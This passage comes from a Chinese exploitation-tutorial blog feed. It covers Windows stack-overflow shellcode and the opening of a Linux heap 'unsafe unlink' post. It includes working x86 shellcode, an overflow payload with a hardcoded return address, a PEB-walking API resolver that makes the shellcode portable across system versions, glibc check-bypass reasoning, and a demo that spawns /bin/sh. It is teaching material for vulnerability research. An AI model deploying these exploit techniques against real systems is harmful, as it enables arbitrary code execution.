class="string">"kernel32.dll"</span>);</span><br><span class="line">    WinExec(<span class="string">"calc.exe"</span>, <span class="number">0</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们需要载入kernel32.dll（win32默认已载入，这里仅作演示，实际可删除这行代码），然后调用它WinExec这个方法，传入两个参，一个参是0，一个参是”calc.exe”。之后调用ExitProcess，传入参数0，退出程序。</p><p><strong>获取LoadLibrary和ExitProcess在内存中的地址</strong></p><p>LoadLibrary和ExitProcess属于kernel32.dll的功能，kernel32.dll在程序启动时就已默认加载，那么只需从内存中获得这两个方法的地址即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcLoad;</span><br><span class="line">MYPROC ProcExit;</span><br><span class="line">MYPROC ProcBox;</span><br><span class="line">MYPROC ProcWinExec;</span><br><span class="line"></span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">"kernel32"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"kernel32 = 0x%x\n"</span>, LibHandle);</span><br><span class="line"></span><br><span class="line">        ProcLoad=(MYPROC)GetProcAddress(LibHandle,<span class="string">"LoadLibraryA"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"LoadLibraryA = 0x%x\n"</span>, ProcLoad);</span><br><span class="line">ProcExit=(MYPROC)GetProcAddress(LibHandle,<span class="string">"ExitProcess"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ExitProcess = 0x%x\n"</span>, ProcExit);</span><br><span class="line">ProcWinExec = (MYPROC)GetProcAddress(LibHandle, <span class="string">"WinExec"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WinExec = 0x%x\n"</span>, ProcWinExec);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LibHandle = LoadLibrary(<span class="string">"user32"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"user32 = 0x%x\n"</span>, LibHandle);</span><br><span class="line">ProcBox=(MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"MessageBoxA = 0x%x\n"</span>, ProcBox);</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存他们的地址，接着就是编写汇编去调用这两个方法了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sub esp,<span class="number">0x40</span>        <span class="comment">// 抬高栈帧</span></span><br><span class="line">xor ebx,ebx         <span class="comment">// 清空ebx </span></span><br><span class="line">push ebx<span class="comment">// ebx入栈，00000000 作为字符的截断</span></span><br><span class="line">push <span class="number">0x6578652E</span>     <span class="comment">// 将字符串“calc.exe”转为16进制为 63616c632e657865</span></span><br><span class="line">push <span class="number">0x636C6163</span>     <span class="comment">// 8个一组，不足的用20补齐。因为是小端显示，所以从后向前填写，注意push的顺序</span></span><br><span class="line">mov eax,esp         <span class="comment">// 在字符串入栈完毕后，esp指向字符串的起始位置. 此时eax = calc.exe</span></span><br><span class="line">push ebx            <span class="comment">// 参数入栈，0</span></span><br><span class="line">push eax            <span class="comment">// 参数入栈,calc.exe</span></span><br><span class="line">mov ecx,<span class="number">0x7C86114D</span>  <span class="comment">// 0x7C86114D为WinExec在内存中的地址</span></span><br><span class="line">call ecx            <span class="comment">// WinExec("calc.exe", 0);</span></span><br><span class="line">xor ebx,ebx        </span><br><span class="line">push ebx           <span class="comment">// 参数入栈</span></span><br><span class="line">mov eax,<span class="number">0x7C81CAA2</span> <span class="comment">// 0x7C81CAA2为ExitProcess在内存中的地址</span></span><br><span class="line">call eax           <span class="comment">// ExitProcess(0);</span></span><br></pre></td></tr></table></figure><p>将这段汇编拖入AsmToE，获取机器码，并用\x替换空格。</p><p><strong>Shellcode和完整代码如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\x41\x41\x41\x41\x41\x41\x41\x41"</span>  <span class="comment">// name[0]~name[7]</span></span><br><span class="line">     <span class="string">"\x41\x41\x41\x41"</span>                      <span class="comment">// Overlap EBP</span></span><br><span class="line">     <span class="string">"\xed\x1e\x96\x7c"</span>                        <span class="comment">// Return Address(Address of "Jmp eax")</span></span><br><span class="line">  <span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span> <span class="comment">// shellcode</span></span><br><span class="line"><span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line"><span class="string">"\xDB\x53"</span></span><br><span class="line"><span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line"><span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line"><span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>攻击二中，LoadLibrary、WinExec、ExitProcess的地址是我们手动获取的，这意味着这个溢出shellcode在不同的操作系统版本上均需要重新获取对应的地址方可使用，有办法可以编写通用脚本吗？</p><h2 id="三、攻击：编写系统版本通用的Shellcode"><a href="#三、攻击：编写系统版本通用的Shellcode" class="headerlink" title="三、攻击：编写系统版本通用的Shellcode"></a>三、攻击：编写系统版本通用的Shellcode</h2><p>在本次的Shellcode中，我们调用了如下的函数：WinExec、LoadLibrary、ExitProcess。</p><p><strong>Target：</strong>编写通用Shellcode的目的就是要让我们的Shellcode能在目标OS中自行定位以上3个函数在内存中的实际位置并进行调用。</p><p><strong>原理：</strong></p><ul><li>定位dll中函数导出表的位置，拿到它的导出函数名列表</li><li>做hash比较查找指定函数（WinExec等），比较成功后从RVA中获取它相对于dll的偏移地址</li><li>再加上dll的基址就能得到该函数在内存中的绝对地址。</li></ul><p><strong>细节：</strong></p><p>所有的win32程序都会加载ntdll.dll和kernel32.dll，如果要定位kernel32.dll中的API地址，可以用如下方法：</p><ol><li>首先通过段选择字FS在内存中找到当前的线程环境块TEB</li><li>线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针</li><li>进程环境块PEB中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针，其中存放着已经被进程装载的动态链接库的信息。</li><li>PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针。</li><li>模块初始化链表按顺序存放着PE装入运行时初始化模块的信息，第一个链表节点是ntdll.dll，第二个节点就是kernel32.dll</li><li>找到kernel32.dll节点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。</li><li>从kernel32.dll的加载基址算起，偏移0x3C的地方就是其PE头</li><li>PE头偏移0x78的地方存放着指向函数导出表的指针</li><li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。<ol><li>导出表偏移0x1C处的指针指向存储导出函数偏移地址（RVA）的列表</li><li>导出表偏移0x20处的指针指向存储导出函数名的列表</li><li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA</li><li>获得RVA后，再加上前边已经得到的动态链接库的基地址，就能算出API此时在内存中的绝对地址</li></ol></li></ol><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_locateAPI.png" alt="LocateAPI"></p><p><strong>代码如下：</strong></p><p>获取函数名hash的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetHash</span><span class="params">(<span class="keyword">char</span> *fun_name)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    DWORD digest = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">while</span>(*fun_name)  </span><br><span class="line">    &#123;  </span><br><span class="line">        digest = ((digest &lt;&lt; <span class="number">25</span>) | (digest &gt;&gt; <span class="number">7</span> ));  </span><br><span class="line">        digest += *fun_name;  </span><br><span class="line">        fun_name++;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> digest;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    DWORD hash;  </span><br><span class="line">    hash = GetHash(<span class="string">"MessageBoxA"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The hash of MessageBoxA is 0x%.8x\n"</span>, hash);  </span><br><span class="line">    hash = GetHash(<span class="string">"ExitProcess"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The hash of ExitProcess is 0x%.8x\n"</span>, hash);  </span><br><span class="line">    hash = GetHash(<span class="string">"LoadLibraryA"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The hash of LoadLibraryA is 0x%.8x\n"</span>, hash);</span><br><span class="line">hash = GetHash(<span class="string">"WinExec"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The hash of WinExec is 0x%.8x\n"</span>, hash);  </span><br><span class="line">    getchar();  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在将hash压入栈中之前，先将增量标识DF清零，因为当Shellcode是利用异常处理机制而植入的时候，往往会产生标志位的变化，使Shellcode中的字串处理方向发生变化而产生错误。</p><p>因此使用 CLD指令就可增大ShellCode的通用性</p><p><strong>完整代码如下：</strong></p><p>复制_asm包裹的汇编，拖入AsmToE转换为机器指令即可生成shellcode的16进制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm&#123;</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">CLD; clear flag DF</span><br><span class="line">;store hash</span><br><span class="line">push <span class="number">0x01a22f51</span>; hash of WinExec</span><br><span class="line">push <span class="number">0x4fd18963</span>; hash of ExitProcess</span><br><span class="line">push <span class="number">0x0c917432</span>; hash of LoadLibraryA</span><br><span class="line">mov esi,esp; esi = addr of first function hash </span><br><span class="line">lea edi,[esi<span class="number">-0xc</span>]; edi = addr to start writing function </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; make some <span class="built_in">stack</span> space</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh, <span class="number">0x04</span>  </span><br><span class="line">sub esp, ebx </span><br><span class="line"></span><br><span class="line">xor edx,edx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">mov ebx, fs:[edx + <span class="number">0x30</span>] ; ebx = address of PEB </span><br><span class="line">mov ecx, [ebx + <span class="number">0x0c</span>] ; ecx = pointer to loader data </span><br><span class="line">mov ecx, [ecx + <span class="number">0x1c</span>] ; ecx = first entry in initialisation order <span class="built_in">list</span> </span><br><span class="line">mov ecx, [ecx] ; ecx = second entry in <span class="built_in">list</span> (kernel32.dll) </span><br><span class="line">mov ebp, [ecx + <span class="number">0x08</span>] ; ebp = base address of kernel32.dll     </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">find_lib_functions: </span><br><span class="line">; lodsd的作用是将DS:ESI中指向的数据放到eax中，一次读取一个DWORD，在这里也就是依次读取<span class="number">3</span>个hash</span><br><span class="line">lodsd ; load next hash into al <span class="keyword">and</span> increment esi </span><br><span class="line">jmp find_functions </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_functions: </span><br><span class="line">pushad ; preserve registers </span><br><span class="line">mov eax, [ebp + <span class="number">0x3c</span>]; eax = start of PE header </span><br><span class="line">mov ecx, [ebp + eax + <span class="number">0x78</span>]; ecx = relative offset of <span class="keyword">export</span> table </span><br><span class="line">add ecx, ebp ; ecx = absolute addr of <span class="keyword">export</span> table </span><br><span class="line">mov ebx, [ecx + <span class="number">0x20</span>] ; ebx = relative offset of names table </span><br><span class="line">add ebx, ebp ; ebx = absolute addr of names table </span><br><span class="line">xor edi, edi ; edi will count through the functions </span><br><span class="line"></span><br><span class="line">next_function_loop: </span><br><span class="line">inc edi ; increment function counter </span><br><span class="line">mov esi, [ebx + edi * <span class="number">4</span>] ; esi = relative offset of current function name </span><br><span class="line">add esi, ebp ; esi = absolute addr of current function name </span><br><span class="line">cdq ; <span class="function">dl will hold <span class="title">hash</span> <span class="params">(we know eax is small)</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line">hash_loop: </span><br><span class="line">movsx eax, byte ptr[esi]</span><br><span class="line">cmp al,ah</span><br><span class="line">jz compare_hash</span><br><span class="line">ror edx,<span class="number">7</span></span><br><span class="line">add edx,eax</span><br><span class="line">inc esi</span><br><span class="line">jmp hash_loop</span><br><span class="line"></span><br><span class="line">compare_hash:</span><br><span class="line">cmp edx, [esp + <span class="number">0x1c</span>] ; <span class="function">compare to the requested <span class="title">hash</span> <span class="params">(saved on <span class="built_in">stack</span> from pushad)</span> </span></span><br><span class="line"><span class="function">jnz next_function_loop </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mov ebx, [ecx + 0x24] ; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp ; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + <span class="number">2</span> * edi] ; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + <span class="number">0x1c</span>] ; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp ; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + <span class="number">4</span> * edi] ; <span class="function">add to <span class="title">ebp</span> <span class="params">(base addr of <span class="keyword">module</span>)</span> the </span></span><br><span class="line"><span class="function"></span>; relative offset of matched function </span><br><span class="line">xchg eax, ebp ; move func addr into eax </span><br><span class="line">pop edi ; edi is last onto <span class="built_in">stack</span> in pushad </span><br><span class="line">stosd ; write function addr to [edi] <span class="keyword">and</span> increment edi </span><br><span class="line">push edi </span><br><span class="line">popad; restore registers </span><br><span class="line"> ; loop until we reach end of last hash </span><br><span class="line">cmp eax,<span class="number">0x01a22f51</span></span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br><span class="line">function_call:</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx<span class="comment">// cut string</span></span><br><span class="line">push <span class="number">0x6578652e</span></span><br><span class="line">push <span class="number">0x636c6163</span></span><br><span class="line">mov eax,esp<span class="comment">// load address of calc.exe</span></span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">call [edi - <span class="number">0x04</span>] ; <span class="comment">// call WinExec</span></span><br><span class="line">push ebx</span><br><span class="line">call [edi - <span class="number">0x08</span>] ; <span class="comment">// call ExitProcess</span></span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h2><p>本篇的shellcode尚不完善，jmp esp目前也是手动获取的，但本文的主要目的是在于梳理栈溢出的基础，在接下来的几篇文章中，会不断完善这个Shellcode，包括绕过一些安全措施等等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
&lt;p&gt;Book: 《0day安全：软件漏洞分析技术》&lt;/p&gt;
&lt;p&gt;知识点的主要来源是”0day安全：软件漏洞分析技术”和网络，但发现它内部80%漏洞利用代码均无法直接在自己的机器上运行。因此本通关专栏不会完全按书的内容规划，在必要的时候会自行实现&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>Linux 堆溢出 Unsafe unlink</title>
    <link href="http://imlzq.com/2018/07/04/Linux%20%E5%A0%86%E6%BA%A2%E5%87%BA%20Unsafe%20link/"/>
    <id>http://imlzq.com/2018/07/04/Linux 堆溢出 Unsafe link/</id>
    <published>2018-07-03T16:00:00.000Z</published>
    <updated>2019-05-03T08:22:06.375Z</updated>
    
    <content type="html"><![CDATA[<p>前文<a href="http://imlzq.com/2018/07/03/Linux%20%E5%A0%86/">Linux 堆</a>介绍了Linux的堆管理策略，这篇文章就介绍一下堆的溢出攻击方式之一：unsafe unlink.</p><a id="more"></a><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>从前文我们可以了解到这个关键点：free一个chunk时，若与该chunk物理相邻的前/后堆块也为空闲状态，那么便会分别触发向后合并/向前合并,即unlink.   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = p-&gt;fd;</span><br><span class="line">bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><blockquote><p>示意图：chunkA-&gt;chunkB</p><p>ChunkA = prev_size | chunksize&amp;flag | content</p><p>ChunkB = prev_size | chunkSize&amp;flag | content</p></blockquote><p>如果此时chunkA存在堆溢出漏洞，那么我们便可将精心构造的数据写入chunkB.</p><p>故攻击如下：</p><blockquote><p>在chunkA中设置一个fakeChunk，并修改chunkB的flag指针为0（即前一个chunk处于空闲状态）。那么在我们free(chunkB)时，堆管理器就会将chunkB和我们的fakeChunk合并。从而触发一次任意的写操作：bk-&gt;fd = fd.      只要我们再让bk-&gt;fd等于任意函数的got地址或者其他后续会被调用的东西，fd设置为shellcode地址。那么之后该函数的具体实现就会被替换为我们的shellcode</p></blockquote><p>这里其实有个小tips，那就是堆管理器如何根据当前堆块的指针确定上一个堆块的位置呢？答案是prev_size+pointer。</p><p><strong>绕过glibc的安全防护：</strong></p><p>因为存在double free以及内存腐败的问题，因此glibc推出了一系列的机制去检测free时该内存块是否正确。</p><ul><li>p-&gt;fd-&gt;bk = p &amp;&amp; p-&gt;bk-&gt;fd = p</li><li>b.prev_size = a.chunkSize</li></ul><blockquote><p>针对第一个问题，我们要做的就是找到一个指向堆的指针，然后让我们的fakeFD = pointer -3 <em> sizeof(uint_32), fakeBK = pointer - 2</em> sizeof(uint_32).即，分别减去0xc和0x8，在64位的系统系统上分别为0x18和0x10.</p></blockquote><p><strong>这是为啥呢？</strong></p><p>其实是因为取fd的地址实际就是找fd相对于p的偏移，取bk得地址实际就是找bk相对于p的偏移。那偏移怎么算？fakeFD和p中间隔了fake_chunksize（p == fake_prev_size），自己是p + 4。fakeBK与p隔了chunksize、fakefd，自己是p + 4 * 2. </p><blockquote><p>第二个问题就简单多了，我们只需要覆盖chunkB的prev_size == fakeChunk的size，chunkB的flag第一位 == 0就搞定了</p></blockquote><h2 id="Vulunerable-Demo-amp-exploit"><a href="#Vulunerable-Demo-amp-exploit" class="headerlink" title="Vulunerable Demo &amp; exploit"></a>Vulunerable Demo &amp; exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之所以创建一个全局数组，是为了模拟真实场景。</span></span><br><span class="line"><span class="comment">// 一般创建chunk后，都会把它交给一个全局的chunkList去管理和获取</span></span><br><span class="line"><span class="keyword">uint32_t</span> *chunkList[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> malloc_size = <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span 